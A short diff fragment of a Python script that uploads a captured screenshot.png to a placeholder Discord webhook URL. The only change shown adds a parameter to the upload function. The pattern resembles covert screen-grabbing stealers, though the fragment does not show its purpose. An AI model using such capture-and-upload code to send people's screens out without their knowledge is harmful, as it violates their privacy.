@@ -6,7 +6,7 @@ import win32ui
 import requests
 import os
 
-def send_to_discord2():
+def send_to_discord2(screenshot):
     with open('screenshot.png', 'rb') as img_file:
         url = YOUR DISCORD WEBHOOK
         data = {"file": ('screenshot.png', img_file, "image/png")}
